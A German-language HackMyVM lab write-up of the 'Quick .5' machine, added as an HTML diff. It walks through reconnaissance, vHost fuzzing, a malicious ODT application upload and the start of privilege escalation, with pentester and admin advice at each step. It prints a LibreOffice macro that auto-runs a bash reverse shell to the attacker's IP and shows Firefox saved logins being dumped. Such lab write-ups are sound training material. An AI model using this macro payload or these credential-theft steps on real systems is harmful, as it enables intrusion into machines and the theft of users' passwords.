@@ -1,1 +1,381 @@
-﻿<html><body><h1>Test-Inhalt für Quick5 - HackMyVM - Easy.html</h1></body></html>
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quick .5 - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+
+    <div class="header-bg">
+        <h1>Quick .5 - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">username-anarchy</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">libreoffice</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">jq</div>
+                <div class="tool-item">tar</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">firefox_decrypt.py</div>
+                <div class="tool-item">su</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#poc-rce">Proof of Concept (Macro RCE)</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>192.168.2.209	08:00:27:02:60:6d	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der erste Schritt war die Identifizierung des Ziels im lokalen Netzwerk. Ich habe einen `arp-scan` durchgeführt, der die IP-Adresse `192.168.2.209` in Verbindung mit einer MAC-Adresse von "PCS Systemtechnik GmbH" aufdeckte. Dies ist ein starker Indikator für eine Oracle VirtualBox VM.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die ARP-Scan-Methode ist für die initiale Host-Entdeckung in einem LAN schnell und zuverlässig. Die Information, dass es sich um eine VM handelt, ist nützlich, da dies bestimmte Verhaltensweisen oder Standardkonfigurationen implizieren kann. Die IP `192.168.2.209` ist unser primäres Ziel für die weiteren Scans.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie interne Scans immer auf Layer 2 (ARP), bevor Sie zu Layer 3 (ICMP/TCP) übergehen. Notieren Sie sich den Hardware-Hersteller, da dies Hinweise auf das Betriebssystem oder die Umgebung geben kann.<br><strong>Empfehlung (Admin):</strong> Auch wenn ARP-Scans schwer zu unterbinden sind, kann eine Netzwerk-Zugangskontrolle (NAC) dabei helfen, unautorisierte Geräte im Netzwerk zu erkennen und zu isolieren.</p>
+            
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">grep 209 /etc/hosts</span></div>
+                    <pre>192.168.2.209   quick5.hmv</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Um die Arbeit zu erleichtern und potenziellen virtuellen Hosts gerecht zu werden, habe ich die gefundene IP-Adresse in meine lokale `/etc/hosts`-Datei eingetragen. Ich habe ihr den logischen Namen `quick5.hmv` gegeben. Dies ermöglicht es mir, das Ziel über einen Hostnamen anstelle der IP-Adresse anzusprechen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein wichtiger Schritt für die Effizienz und für das Testen von Webanwendungen, die auf virtuellen Hosts basieren. Viele Webserver leiten Anfragen je nach dem im HTTP-Request angegebenen `Host`-Header an unterschiedliche Webseiten weiter. Ohne korrekte Hostnamen in der `/etc/hosts` würde man diese Seiten möglicherweise nie zu Gesicht bekommen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Machen Sie es sich zur Gewohnheit, IPs sofort in Ihre `/etc/hosts`-Datei einzutragen. Beginnen Sie mit einem Basis-Hostnamen und erweitern Sie diesen, sobald Sie weitere Subdomains oder vHosts entdecken.<br><strong>Empfehlung (Admin):</strong> Dokumentieren Sie alle verwendeten Hostnamen und Subdomains. Dies hilft nicht nur bei der Verwaltung, sondern auch bei der Konfiguration von Sicherheits-Scannern und Monitoring-Tools.</p>
+            
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 22:31 CEST
+Nmap scan report for quick5.hmv (192.168.2.209)
+Host is up (0.00014s latency).
+Not shown: 65533 closed tcp ports (reset)
+<span class="command">PORT   STATE SERVICE VERSION</span>
+<span class="command">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span>
+| ssh-hostkey: 
+|   256 84:e8:9c:b0:23:44:41:29:ae:7d:0b:0f:fe:88:08:c0 (ECDSA)
+|_  256 44:82:b7:78:47:02:7e:b4:40:c7:6b:fd:70:68:c1:42 (ED25519)
+<span class="command">80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</span>
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Quick Automative - Home
+MAC Address: 08:00:27:02:60:6D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+...
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms quick5.hmv (192.168.2.209)
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan des Ziels hat zwei offene Ports aufgedeckt: Port 22 (SSH) und Port 80 (HTTP). Der SSH-Dienst läuft auf OpenSSH 8.9p1 auf einem Ubuntu-System. Der HTTP-Dienst wird von einem Apache 2.4.52 Webserver betrieben, ebenfalls auf Ubuntu. Der Titel der Webseite lautet "Quick Automative - Home".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Angriffsfläche ist klar definiert. SSH ist ein potenzieller Vektor, falls Anmeldeinformationen gefunden werden, aber die Version ist modern und wahrscheinlich nicht direkt angreifbar. Der Hauptangriffsvektor ist der Webserver auf Port 80. Die Versionsinformationen (Apache 2.4.52, OpenSSH 8.9p1) sind wertvoll für die Suche nach bekannten Schwachstellen (CVEs).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nachdem die primären Ports identifiziert sind, sollte der nächste Schritt eine tiefgehende Untersuchung des Webservers sein. Suchen Sie nach Verzeichnissen, Dateien, Subdomains und potenziellen Schwachstellen in der Webanwendung selbst.<br><strong>Empfehlung (Admin):</strong> Verbergen Sie detaillierte Versionsinformationen von Diensten wie Apache und SSH in der Konfiguration (z.B. `ServerTokens Prod` in Apache). Dies erschwert es einem Angreifer, gezielt nach Exploits für eine bestimmte Version zu suchen.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>Allow: OPTIONS,HEAD,GET,POST</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Eine `OPTIONS`-Anfrage an den Webserver (wahrscheinlich via `curl -X OPTIONS` oder durch Tools wie Nikto) hat die erlaubten HTTP-Methoden aufgedeckt: `OPTIONS`, `HEAD`, `GET`, `POST`. Dies sind Standardmethoden für eine typische Webseite.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Fehlen von potenziell gefährlichen Methoden wie `PUT` oder `DELETE` ist ein gutes Zeichen aus Verteidigersicht. Für mich als Angreifer bedeutet dies, dass ich mich auf Schwachstellen konzentrieren muss, die über `GET`- und `POST`-Anfragen ausgenutzt werden können, wie z.B. SQL-Injection, Cross-Site-Scripting oder unsichere Dateiuploads.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Prüfen Sie immer die erlaubten HTTP-Methoden. Manchmal sind Methoden wie `PUT` fälschlicherweise aktiviert, was das direkte Hochladen von Webshells ermöglichen könnte.<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie alle nicht benötigten HTTP-Methoden auf Ihrem Webserver. In den meisten Fällen sind `GET`, `POST` und `HEAD` ausreichend.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Server: Apache/2.4.52 (Ubuntu)
+<span class="command">+ /: The anti-clickjacking X-Frame-Options header is not present.</span>
+<span class="command">+ /: The X-Content-Type-Options header is not set.</span>
+<span class="command">+ /: Server may leak inodes via ETags, header found with file /, inode: c93f, size: 61148fc459500, mtime: gzip.</span>
+<span class="command">+ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54).</span>
+<span class="command">+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .</span>
+<span class="command">+ /css/: Directory indexing found.</span>
+<span class="command">+ /img/: Directory indexing found.</span>
+<span class="command">+ /lib/: Directory indexing found.</span>
+...
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich habe einen `Nikto`-Scan gegen den Webserver ausgeführt, um nach bekannten Schwachstellen und Fehlkonfigurationen zu suchen. Nikto hat mehrere interessante Punkte gemeldet: Fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`), eine potenziell veraltete Apache-Version und, am wichtigsten, die Aktivierung von "Directory Indexing" für die Verzeichnisse `/css/`, `/img/` und `/lib/`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Directory Indexing ist ein wichtiger Fund. Es bedeutet, dass ich, wenn ich diese Verzeichnisse direkt aufrufe, eine Liste aller darin enthaltenen Dateien erhalte. Dies ist eine Goldgrube für die Enumeration, da ich mir so ein Bild von den verwendeten JavaScript-Bibliotheken, CSS-Frameworks und anderen Ressourcen machen kann, ohne raten zu müssen. Dies kann zu Hinweisen auf veraltete und verwundbare Komponenten führen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie immer Verzeichnisse, für die Directory Indexing aktiviert ist. Suchen Sie nach interessanten Dateinamen, Konfigurationsdateien, Backups oder Skripten, die nicht direkt von der Webseite verlinkt sind.<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie Directory Indexing global in Ihrer Apache-Konfiguration (z.B. mit `Options -Indexes`). Dies ist eine grundlegende Härtungsmaßnahme, um die Informationspreisgabe zu minimieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+===============================================================
+Gobuster v3.6
+...
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://192.168.2.209/index.html           (Status: 200) [Size: 51519]</span>
+<span class="command">http://192.168.2.209/img                  (Status: 301) [Size: 312] [--> http://192.168.2.209/img/]</span>
+<span class="command">http://192.168.2.209/css                  (Status: 301) [Size: 312] [--> http://192.168.2.209/css/]</span>
+<span class="command">http://192.168.2.209/lib                  (Status: 301) [Size: 312] [--> http://192.168.2.209/lib/]</span>
+<span class="command">http://192.168.2.209/js                   (Status: 301) [Size: 311] [--> http://192.168.2.209/js/]</span>
+<span class="command">http://192.168.2.209/fonts                (Status: 301) [Size: 314] [--> http://192.168.2.209/fonts/]</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Scan mit `gobuster` bestätigte die bereits von Nikto gefundenen Verzeichnisse (`/img`, `/css`, `/lib`) und fand zusätzlich `/js` und `/fonts`. Es wurden keine versteckten oder ungewöhnlichen Dateien auf der obersten Ebene gefunden. `feroxbuster` lieferte ähnliche Ergebnisse, durchsuchte aber rekursiv die gefundenen Verzeichnisse und listete viele einzelne Bilddateien auf, was die Directory-Indexing-Anfälligkeit weiter bestätigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Directory-Bruteforce-Scans haben keine "Quick-Win"-Schwachstelle wie eine Admin-Login-Seite oder eine ungeschützte Konfigurationsdatei aufgedeckt. Die Ergebnisse deuten darauf hin, dass die Webseite eine Standard-Template-Struktur verwendet. Meine Aufmerksamkeit richtet sich nun auf die Analyse der Webseite selbst und auf die Entdeckung potenzieller Subdomains.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie immer mehrere Tools zur Inhaltserkennung aus. Manchmal findet ein Tool etwas, das ein anderes übersieht. Wenn die oberste Ebene keine Ergebnisse liefert, sind rekursive Scans und die Suche nach Subdomains die logischen nächsten Schritte.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Ihre Webserver-Konfiguration keine sensiblen Verzeichnisse oder Dateien preisgibt. Blockieren Sie den Zugriff auf alles, was nicht explizit öffentlich sein soll.</p>
+        </section>
+                <section id="web-enumeration">
+            <p class="analysis"><strong>Analyse:</strong> Bei der Untersuchung des Quellcodes der Hauptseite fand ich Hinweise auf die Web-Template-Ersteller (`HTML Codex`, `ThemeWagon`) sowie eine Liste von eingebundenen JavaScript-Bibliotheken. Diese Informationen sind nützlich, um die Herkunft der Seite zu verstehen, deuten aber auf eine generische Vorlage hin. Wichtiger ist, dass ich bei manueller Erkundung der Seite auf der Kontaktsektion (`/#contact`) mehrere E-Mail-Adressen fand, die auf die Domain `@quick.hmv` enden: `book@`, `info@` und `tech@`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Entdeckung der Domain `quick.hmv` ist ein entscheidender Schritt. Es ist sehr wahrscheinlich, dass die Webseite und potenziell andere Dienste auf virtuelle Hosts reagieren, die diese Domain verwenden. Die E-Mail-Adressen selbst sind nützlich für potenzielle Phishing-Angriffe oder zur Erstellung von Benutzerlisten, aber die Domain ist im Moment der wichtigere Fund.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie immer den gesamten sichtbaren Inhalt einer Webseite, einschließlich Kontaktseiten, "Über uns"-Seiten und dem Footer. Oft finden sich hier Domains, Namen von Mitarbeitern oder Technologien. Jede Information ist ein Puzzleteil.<br><strong>Empfehlung (Admin):</strong> Seien Sie sich bewusst, welche Informationen Sie auf Ihrer Webseite preisgeben. Obwohl Kontaktdaten notwendig sind, können sie von Angreifern für Social Engineering und die Enumeration von Benutzernamen missbraucht werden.</p>
+            
+            <p class="analysis"><strong>Analyse:</strong> Basierend auf der Vermutung, dass die Webseite auf virtuelle Hosts reagiert, habe ich versucht, verschiedene Subdomains aufzurufen, z.B. `customer.quick.hmv`. Dies schlug zunächst fehl. Mir wurde klar, dass ich diese Subdomains erst meiner lokalen `/etc/hosts`-Datei hinzufügen muss, damit mein Browser und meine Tools wissen, dass sie zur IP `192.168.2.209` gehören.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">grep 209 /etc/hosts</span></div>
+                    <pre>192.168.2.209   quick5.hmv customer.quick.hmv</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Nach dem Hinzufügen von `customer.quick.hmv` zu meiner `hosts`-Datei konnte ich die Seite erfolgreich aufrufen. Sie zeigte eine Wartungsmeldung, die auf einen kürzlichen "Hack" hinweist. Dies ist ein extrem aufschlussreicher Hinweis, der andeutet, dass das System möglicherweise kürzlich kompromittiert wurde und eventuell Backups oder Reste des Angriffs vorhanden sind.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wenn Sie eine Domain gefunden haben, starten Sie sofort mit dem Testen gängiger Subdomains (www, mail, dev, test, blog, shop, customer, employee, careers, etc.). Fügen Sie jede potenziell gültige Subdomain zu Ihrer `/etc/hosts`-Datei hinzu, um sie zu testen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass interne oder nicht für die Öffentlichkeit bestimmte Subdomains nicht aus dem Internet erreichbar sind oder durch eine strikte Zugriffskontrolle geschützt werden. Wartungsmeldungen sollten niemals Details wie einen "Hack" erwähnen, da dies Angreifer anzieht.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://quick.hmv" -H "Host: FUZZ.quick.hmv" --hc "404" --hh 51519</span></div>
+                    <pre>
+...
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                      
+=====================================================================
+
+<span class="command">000000450:   200        244 L    1067 W     13819 Ch    "careers"</span>                                                                                                                    
+<span class="command">000000859:   200        40 L     189 W      2258 Ch     "customer"</span>                                                                                                                     
+<span class="command">000007454:   200        40 L     189 W      2258 Ch     "employee"</span>                                                                                                                   
+...                                                                                                                    
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Um systematisch nach weiteren Subdomains zu suchen, habe ich `wfuzz` für ein vHost-Bruteforcing eingesetzt. Ich habe den `Host`-Header mit dem `FUZZ`-Keyword versehen und eine umfangreiche Subdomain-Liste verwendet. Der Filter `--hh 51519` wurde verwendet, um die Standardseite (die 51519 Zeichen hat) aus den Ergebnissen auszuschließen und nur abweichende Antworten zu sehen. Der Scan hat erfolgreich die Subdomains `careers`, `customer` und `employee` identifiziert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein großer Erfolg. Ich habe nun drei neue, potenziell interessante Angriffsflächen gefunden. Die Subdomain `careers` deutet auf eine Jobbörse hin, was oft mit Dateiupload-Funktionen verbunden ist. `employee` deutet auf einen internen Bereich oder ein Mitarbeiterportal hin. Diese sind die vielversprechendsten Ziele.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> vHost-Bruteforcing ist eine essentielle Technik, wenn Sie eine Domain, aber keine weiteren Subdomains kennen. Filtern Sie die Ergebnisse sorgfältig, um "False Positives" (wie die Standardseite) zu entfernen. `wfuzz` ist für diese Aufgabe hervorragend geeignet.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie eine "Catch-All"-Regel auf Ihrem Webserver, die alle Anfragen an unbekannte Hostnamen auf eine leere Seite oder eine Fehlerseite umleitet, anstatt die Standardseite anzuzeigen. Dies macht das vHost-Bruteforcing anhand der Inhaltslänge (`--hh`) deutlich schwieriger.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">grep 209 /etc/hosts</span></div>
+                    <pre>192.168.2.209   quick5.hmv customer.quick.hmv careers.quick.hmv quick.hmv employee.quick.hmv</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich habe meine `/etc/hosts`-Datei aktualisiert und alle neu gefundenen Subdomains (`careers`, `employee`, `quick.hmv` als Basis) hinzugefügt, um alle Seiten korrekt auflösen und untersuchen zu können.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein notwendiger administrativer Schritt, um die Enumeration der neuen Ziele fortsetzen zu können.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Halten Sie Ihre `hosts`-Datei immer auf dem neuesten Stand. Ein gut gepflegter Arbeitsbereich ist der Schlüssel zum Erfolg.<br><strong>Empfehlung (Admin):</strong> Sorgen Sie für eine zentrale und aktuelle DNS-Verwaltung. Dies verhindert Konfigurationschaos und erleichtert die Absicherung.</p>
+            
+            <p class="analysis"><strong>Analyse:</strong> Bei der Untersuchung der `careers.quick.hmv`-Subdomain fand ich eine Bewerbungsseite (`apply.php`), die das Hochladen von Bewerbungsschreiben erlaubt. Die Seite gibt an, dass nur die Formate ODT und PDF erlaubt sind. Dies ist ein klarer Hinweis auf eine Dateiupload-Funktion, die ein klassischer Angriffsvektor ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Eine Dateiupload-Funktionalität ist ein hochinteressantes Ziel. Selbst wenn serverseitige Skripte (wie PHP) blockiert werden, könnte es möglich sein, eine Datei mit einem bösartigen Makro (z.B. in einem ODT-Dokument) hochzuladen. Wenn ein Mitarbeiter diese Datei später öffnet, könnte das Makro ausgeführt werden und eine Reverse Shell auslösen. Dies ist mein primärer Angriffsplan.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen Sie jede Dateiupload-Funktion rigoros. Versuchen Sie, verschiedene Dateitypen hochzuladen (PHP, PHTML, SVG mit XSS, etc.). Wenn nur "sichere" Formate wie Office-Dokumente erlaubt sind, ist ein Makro-Angriff der nächste logische Schritt.<br><strong>Empfehlung (Admin):</strong> Härten Sie Dateiupload-Funktionen extrem. Überprüfen Sie nicht nur die Dateiendung, sondern auch den MIME-Typ und den tatsächlichen Dateiinhalt (Magic Bytes). Führen Sie alle hochgeladenen Dateien durch einen Virenscanner und speichern Sie sie außerhalb des Web-Wurzelverzeichnisses an einem Ort ohne Ausführungsrechte.</p>
+        </section>
+
+        <section id="poc-rce">
+            <h2>Proof of Concept (Macro RCE)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Um den Makro-Angriff vorzubereiten, habe ich LibreOffice auf meinem System geöffnet. Ich habe ein einfaches Bewerbungsschreiben verfasst, um die Tarnung aufrechtzuerhalten. Der wichtige Teil geschieht im Hintergrund: die Erstellung des bösartigen Makros.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+ REM  *****  BASIC  *****
+
+Sub AutoOpenDocument ' Dieser Name muss mit dem übereinstimmen, was du beim "Open Document" Event auswählst
+    Call ExecuteReverseShell
+End Sub
+
+Sub ExecuteReverseShell
+    Dim sCommand As String
+    ' --- DEINE ANGEPASSTEN DATEN ---
+    sCommand = "bash -c 'bash -i >& /dev/tcp/192.168.2.199/4443 0>&1'"
+    ' ------------------------------
+    Shell(sCommand)
+End Sub
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein klassisches LibreOffice/OpenOffice Basic-Makro. Die `AutoOpenDocument`-Subroutine sorgt dafür, dass das Makro automatisch ausgeführt wird, sobald das Dokument geöffnet wird. Die `ExecuteReverseShell`-Subroutine enthält den eigentlichen Payload: Sie führt einen `bash`-Befehl aus, der eine interaktive Reverse Shell zu meinem Angreifer-System (`192.168.2.199`) auf Port `4443` aufbaut. Der Befehl ist in `bash -c '...'` gekapselt, um eine saubere Ausführung sicherzustellen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Makro-Angriffe sind nach wie vor sehr effektiv, besonders in internen Szenarien oder bei Client-Side-Exploits. Testen Sie Ihre Payloads immer zuerst lokal, um sicherzustellen, dass sie funktionieren, bevor Sie sie auf das Zielsystem hochladen.<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie die automatische Ausführung von Makros firmenweit per GPO (Group Policy Object). Schulen Sie Mitarbeiter darin, niemals Makros in Dokumenten aus unbekannten oder unaufgeforderten Quellen zu aktivieren. Verwenden Sie Office-Suiten, die in einer Sandbox laufen, um den potenziellen Schaden zu begrenzen.</p>
+            
+            <img src="libreoffice_customize.jpg" alt="Konfiguration in LibreOffice Customize für Open Document">
+            <img src="libreoffice_customize_macro.jpg" alt="Konfiguration in LibreOffice Customize für Open Document/Makros">
+            <img src="libreoffice_customize_ExeShell.jpg" alt="Konfiguration in LibreOffice Customize für die Reverse Shell">
+            <img src="libreoffice_save.jpg" alt="Speichern der Konfiguration in LibreOffice">
+
+            <p class="analysis"><strong>Analyse:</strong> Die Screenshots dokumentieren den Prozess, wie das erstellte Makro (`ExecuteReverseShell`) an das "Open Document"-Ereignis in LibreOffice gebunden wird. Dies ist der entscheidende Schritt, der sicherstellt, dass mein Payload automatisch ausgeführt wird, wenn ein Benutzer das Dokument öffnet. Anschließend habe ich das Dokument als `benhacker.odt` gespeichert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Prozess ist korrekt und vollständig. Die "Bombe" ist präpariert. Nachdem ich diese `.odt`-Datei über die Karriereseite hochgeladen habe, muss ich nur noch warten, bis ein Mitarbeiter (wahrscheinlich aus der Personalabteilung) meine "Bewerbung" öffnet und damit die Reverse Shell auslöst.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Eine gute Tarnung ist entscheidend für den Erfolg von Client-Side-Angriffen. Geben Sie sich Mühe, dass das Dokument legitim aussieht. Ein gut geschriebenes Anschreiben erhöht die Wahrscheinlichkeit, dass das Opfer das Dokument öffnet und den Angriff auslöst.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie eine Lösung zur Inhaltsdesinfektion und -rekonstruktion (Content Disarm and Reconstruction, CDR). Solche Systeme zerlegen eingehende Dateien, entfernen aktive Inhalte wie Makros und bauen die Datei dann sicher wieder zusammen, bevor sie dem Endbenutzer zugestellt wird.</p>
+        </section>
+                <section id="initial-access">
+            <h2>Initial Access</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 5555</span></div>
+                    <pre>
+listening on [any] 5555 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.209] 33118</span>
+bash: cannot set terminal process group (958): Inappropriate ioctl for device
+bash: no job control in this shell
+andrew@quick5:~/applicants$  
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Plan war erfolgreich. Nachdem ich die präparierte `.odt`-Datei hochgeladen hatte, wartete ich mit einem offenen Netcat-Listener auf Port 5555. Nach kurzer Zeit kam eine Verbindung vom Zielserver `192.168.2.209` herein. Die Shell meldet sich mit dem Prompt `andrew@quick5:~/applicants$`, was bedeutet, dass ich nun als Benutzer `andrew` auf dem System bin und mich im Verzeichnis `/home/andrew/applicants` befinde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Exzellent. Der Client-Side-Exploit hat funktioniert, und ich habe einen initialen Zugriff auf das System erlangt. Der Benutzer `andrew` scheint ein regulärer Benutzer zu sein, möglicherweise derjenige, der die Bewerbungen sichtet. Die Shell ist derzeit noch nicht voll interaktiv, was die Fehlermeldungen anzeigen, aber das ist ein behebbares Problem.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell sofort mit `python3 -c 'import pty; pty.spawn("/bin/bash")'` oder einer ähnlichen Technik, um eine voll interaktive TTY zu erhalten. Beginnen Sie dann sofort mit der lokalen Enumeration, um die Umgebung zu verstehen und nach Vektoren für die Privilegienerweiterung zu suchen.<br><strong>Empfehlung (Admin):</strong> Dieser Vorfall unterstreicht die Gefahr von Client-Side-Angriffen. Selbst wenn der Server sicher ist, kann ein unvorsichtiger Benutzer das gesamte Netzwerk kompromittieren. Mitarbeiterschulungen und technische Kontrollen (wie Makro-Deaktivierung und CDR) sind unerlässlich.</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+andrew@quick5:~$ find / -type f -name logins.* 2> /dev/null
+<span class="command">/home/andrew/snap/firefox/common/.mozilla/firefox/ii990jpt.default/logins.json</span>
+
+andrew@quick5:~$ cat /home/andrew/snap/firefox/common/.mozilla/firefox/ii990jpt.default/logins.json | jq
+{
+  "nextId": 2,
+  "logins": [
+    {
+      "id": 1,
+      "hostname": "http://employee.quick.hmv",
+      "httpRealm": null,
+      "formSubmitURL": "",
+      "usernameField": "",
+      "passwordField": "",
+      "encryptedUsername": "MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNepBefpo6gOBBgdE205WqBckSpb4BvRJZ22vD+TsZELQik=",
+      "encryptedPassword": "MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNkb1va5UELCBBh9frh1WRFbZl0I5q08OoWxc3MQl/33LkY=",
+...
+    }
+  ],
+...
+}
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Bei der Durchsuchung des Home-Verzeichnisses von `andrew` stieß ich auf einen sehr vielversprechenden Fund: eine `logins.json`-Datei im Firefox-Profilverzeichnis. Firefox speichert hier die Anmeldeinformationen, die der Benutzer im Browser gespeichert hat. Die Datei enthält verschlüsselte Anmeldedaten für die Webseite `http://employee.quick.hmv`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein kritischer Fund. Obwohl die Passwörter verschlüsselt sind, verwendet Firefox einen Mechanismus, der es erlaubt, sie zu entschlüsseln, wenn man Zugriff auf das gesamte Profilverzeichnis und eventuell ein Master-Passwort hat (was hier wahrscheinlich nicht gesetzt ist). Der Plan ist nun, das gesamte Firefox-Profil auf meine Angreifer-Maschine zu exfiltrieren und dort mit einem spezialisierten Tool zu entschlüsseln.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie immer nach Browser-Profilen (Firefox, Chrome, etc.) in den Home-Verzeichnissen der Benutzer. Sie sind eine Goldgrube für gespeicherte Passwörter, Cookies und den Browserverlauf, was wertvolle Hinweise auf weitere Ziele geben kann.<br><strong>Empfehlung (Admin):</strong> Raten Sie Mitarbeitern davon ab, Passwörter in Browsern zu speichern, insbesondere für sensible interne Systeme. Fördern Sie die Verwendung von dedizierten, sicheren Passwort-Managern. Implementieren Sie Endpoint-Security-Lösungen, die den Zugriff auf sensible Anwendungsdaten überwachen und verhindern können.</p>
+
